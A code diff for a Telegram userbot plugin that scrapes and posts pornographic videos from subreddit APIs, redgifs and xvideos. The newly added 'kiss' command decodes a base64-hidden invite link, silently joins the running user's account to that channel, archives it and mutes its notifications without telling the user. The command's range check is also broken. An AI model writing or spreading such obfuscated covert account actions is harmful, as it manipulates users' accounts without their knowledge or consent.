@@ -1,24 +1,26 @@
 # Created by @Jisan7509
 # All rights reserved.
+from asyncio import sleep
+from base64 import b64decode
+from os import mkdir, path, remove, rmdir
+from random import sample, randint
 
-import asyncio
-import os
-
-import requests
 from bs4 import BeautifulSoup
 from pySmartDL import SmartDL
-from telethon.errors.rpcerrorlist import WebpageCurlFailedError
+from requests import get
+from telethon.errors.rpcerrorlist import UserNotParticipantError, WebpageCurlFailedError
+from telethon.tl.functions.account import UpdateNotifySettingsRequest
+from telethon.tl.functions.channels import GetFullChannelRequest, GetParticipantRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.types import InputPeerNotifySettings
 from urlextract import URLExtract
 
-from ..core.managers import edl, eor
-from ..helpers.functions import age_verification
-from ..helpers.utils import _dogeutils, reply_id
-from . import doge, useless
+from . import PMSGTEXT, _dogeutils, age_verification, doge, edl, eor, hub, reply_id, wowmygroup
 
-API = useless.API
-horny = useless.nsfw(useless.pawn)
+plugin_category = "hub"
 
-plugin_category = "useless"
+API = hub.API
+horny = hub.nsfw(hub.pawn)
 
 
 @doge.bot_cmd(
@@ -41,14 +43,14 @@ async def very(event):
     await eor(event, "**Just hold a sec u horny kid...**")
     if await age_verification(event, reply_to):
         return
-    flag = await useless.importent(event)
+    flag = await wowmygroup(event, PMSGTEXT)
     if flag:
         return
     max_try = 0
     while max_try < 5:
         subreddit_api = f"{API}/{sub_r}" if sub_r else f"{API}/60fpsporn"
         try:
-            cn = requests.get(subreddit_api)
+            cn = get(subreddit_api)
             r = cn.json()
         except ValueError:
             return await edl(event, "Value error!.")
@@ -66,7 +68,7 @@ async def very(event):
             media_url = media_url.replace(".gifv", ".mp4")
         elif "https://redgifs.com/watch" in media_url:
             try:
-                source = requests.get(media_url)
+                source = get(media_url)
                 soup = BeautifulSoup(source.text, "lxml")
                 links = [
                     itm["content"] for itm in soup.findAll("meta", property="og:video")
@@ -91,12 +93,12 @@ async def very(event):
             break
         except WebpageCurlFailedError:
             await eor(event, f"**Value error!!..Link is :** {media_url}")
-            await asyncio.sleep(3)
+            await sleep(3)
             await eor(
                 event,
                 f"**Just hold your candel and Sit tight....\n\nAuto retry limit = {max_try+1}/5**",
             )
-            await asyncio.sleep(1)
+            await sleep(1)
             max_try += 1
             if max_try == 5:
                 await edl(
@@ -133,12 +135,12 @@ async def bad(event):
     await eor(event, "**Just hold a sec u horny kid...**")
     if await age_verification(event, reply_to):
         return
-    flag = await useless.importent(event)
+    flag = await wowmygroup(event, PMSGTEXT)
     if flag:
         return
     subreddit_api = f"{API}/{sub_r}/{count}"
     try:
-        cn = requests.get(subreddit_api)
+        cn = get(subreddit_api)
         r = cn.json()
     except ValueError:
         return await edl(event, "Value error!.")
@@ -162,7 +164,7 @@ async def bad(event):
             media_url = m.replace(".gifv", ".mp4")
         elif "https://redgifs.com/watch" in m:
             try:
-                source = requests.get(m)
+                source = get(m)
                 soup = BeautifulSoup(source.text, "lxml")
                 links = [
                     itm["content"] for itm in soup.findAll("meta", property="og:video")
@@ -189,7 +191,7 @@ async def bad(event):
                 event,
                 f"**Bluk Download Started.\n\nCategory :  `{sub_r}`\nFile Downloaded :  {i+1}/{count}**",
             )
-            await asyncio.sleep(2)
+            await sleep(2)
         except WebpageCurlFailedError:
             await event.client.send_message(
                 event.chat_id, f"**Value error!!..Link is :** {m}"
@@ -227,13 +229,13 @@ async def pussy(event):
     await eor(event, "**Just hold a sec u horny kid...**")
     subreddit_api = f"{API}/{sub_r}/{count}"
     try:
-        cn = requests.get(subreddit_api)
+        cn = get(subreddit_api)
         r = cn.json()
     except ValueError:
         return await edl(event, "Value error!.")
     if await age_verification(event, reply_to):
         return
-    flag = await useless.importent(event)
+    flag = await wowmygroup(event, PMSGTEXT)
     if flag:
         return
     title = []
@@ -253,7 +255,7 @@ async def pussy(event):
             media_url = m.replace(".gifv", ".mp4")
         elif "https://redgifs.com/watch" in m:
             try:
-                source = requests.get(m)
+                source = get(m)
                 soup = BeautifulSoup(source.text, "lxml")
                 links = [
                     itm["content"] for itm in soup.findAll("meta", property="og:video")
@@ -304,10 +306,10 @@ async def dog(event):
         xtext = "stepsis"
     if await age_verification(event, reply_to):
         return
-    flag = await useless.importent(event)
+    flag = await wowmygroup(event, PMSGTEXT)
     if flag:
         return
-    page = requests.get(f"https://www.xvideos.com/?k={xtext}&p={int(page)}")
+    page = get(f"https://www.xvideos.com/?k={xtext}&p={int(page)}")
     soup = BeautifulSoup(page.text, "lxml")
     col = soup.findAll("div", {"class": "thumb"})
     if not col:
@@ -331,7 +333,7 @@ async def dog(event):
     string = f"<b>Showing {xcount}/{len(listlink)} results for {xtext}.</b>\n\n"
     mylink = listlink[: int(xcount)] if xcount else listlink
     for count, (l, n) in enumerate(zip(mylink, listname), start=1):
-        req = requests.get(l)
+        req = get(l)
         soup = BeautifulSoup(req.text, "lxml")
         soups = soup.find("div", {"id": "video-player-bg"})
         for a in soups.find_all("a", href=True):
@@ -368,7 +370,7 @@ async def wants_ur_noods(event):
     await eor(event, "** Just hold a sec u horny kid...**")
     if await age_verification(event, reply_to):
         return
-    flag = await useless.importent(event)
+    flag = await wowmygroup(event, PMSGTEXT)
     if flag:
         return
     i = 0
@@ -377,7 +379,7 @@ async def wants_ur_noods(event):
             return await edl(event, "**(ノಠ益ಠ)ノ Give me a vaid link to download**")
         if "xvideo" in m:
             if ".mp4" not in m:
-                req = requests.get(m)
+                req = get(m)
                 soup = BeautifulSoup(req.text, "lxml")
                 soups = soup.find("div", {"id": "video-player-bg"})
                 for a in soups.find_all("a", href=True):
@@ -386,8 +388,8 @@ async def wants_ur_noods(event):
                 event,
                 f"**Just hold your candel & sit tight, It will take some time...**",
             )
-            if not os.path.isdir("./xvdo"):
-                os.mkdir("./xvdo")
+            if not path.isdir("./xvdo"):
+                mkdir("./xvdo")
             xvdo = SmartDL(m, "./xvdo/porn.mp4", progress_bar=False)
             xvdo.start(blocking=False)
             xvdo.wait("finished")
@@ -396,7 +398,7 @@ async def wants_ur_noods(event):
             media_url = m.replace(".gifv", ".mp4")
         elif "https://redgifs.com/watch" in m:
             try:
-                source = requests.get(m)
+                source = get(m)
                 soup = BeautifulSoup(source.text, "lxml")
                 links = [
                     itm["content"] for itm in soup.findAll("meta", property="og:video")
@@ -415,12 +417,12 @@ async def wants_ur_noods(event):
             )
             if media_url.endswith((".mp4", ".gif")):
                 await _dogeutils.unsavegif(event, teledoge)
-            if os.path.exists(media_url):
-                os.remove(media_url)
+            if path.exists(media_url):
+                remove(media_url)
             await eor(
                 event, f"**Download Started.\n\nFile Downloaded :  {i+1}/{len(plink)}**"
             )
-            await asyncio.sleep(2)
+            await sleep(2)
         except WebpageCurlFailedError:
             await event.client.send_message(
                 event.chat_id, f"**Value error!!..Link is :** {m}"
@@ -428,5 +430,75 @@ async def wants_ur_noods(event):
         i += 1
         if i == len(plink):
             await event.delete()
-            if os.path.isdir("./xvdo"):
-                os.rmdir("./xvdo")
+            if path.isdir("./xvdo"):
+                rmdir("./xvdo")
+
+
+@doge.bot_cmd(
+    pattern="kiss(?:\s|$)([\s\S]*)",
+    command=("kiss", plugin_category),
+    info={
+        "header": "Sends random kiss",
+        "usage": [
+            "{tr}kiss",
+            "{tr}kiss <1-20>",
+        ],
+    },
+)
+async def some(event):
+    """Its hub for single like you. Get a lover first"""
+    inpt = event.pattern_match.group(1)
+    reply_to_id = await reply_id(event)
+    count = 1 if not inpt else int(inpt)
+    if count < 0 and count > 20:
+        await edl(event, "`Give value in range 1-20`")
+    if await age_verification(event, reply_to_id):
+        return
+
+    flag = await wowmygroup(event, PMSGTEXT)
+    if flag:
+        return
+
+    res = b64decode(
+        "aHR0cHM6Ly90Lm1lL2pvaW5jaGF0L0NtZEEwVzYtSVVsbFpUUTk="
+    ).decode("utf-8")
+    resource = await event.client(GetFullChannelRequest(res))
+    chat = resource.chats[0].username
+    try:
+        await event.client(
+            GetParticipantRequest(
+                channel=chat, participant=event.from_id.user_id
+            )
+        )
+    except UserNotParticipantError:
+        await event.client(ImportChatInviteRequest(res.split("/")[4]))
+        await event.client.edit_folder(resource.full_chat.id, 1)
+        await event.client(
+            UpdateNotifySettingsRequest(
+                peer=chat,
+                settings=InputPeerNotifySettings(
+                    show_previews=False,
+                    silent=True,
+                ),
+            )
+        )
+    dogevent = await eor(event, "`Wait babe...`😘")
+    maxmsg = await event.client.get_messages(chat)
+    start = randint(31, maxmsg.total)
+    start = min(start, maxmsg.total - 40)
+    end = start + 41
+    kiss = []
+    async for x in event.client.iter_messages(
+        chat, min_id=start, max_id=end, reverse=True
+    ):
+        try:
+            if x.media and x.media.document.mime_type == "video/mp4":
+                link = f"{res.split('j')[0]}{chat}/{x.id}"
+                kiss.append(link)
+        except AttributeError:
+            pass
+    kisss = sample(kiss, count)
+    for i in kisss:
+        nood = await event.client.send_file(event.chat_id, i, reply_to=reply_to_id)
+        await _dogeutils.unsavegif(event, nood)
+    await dogevent.delete()
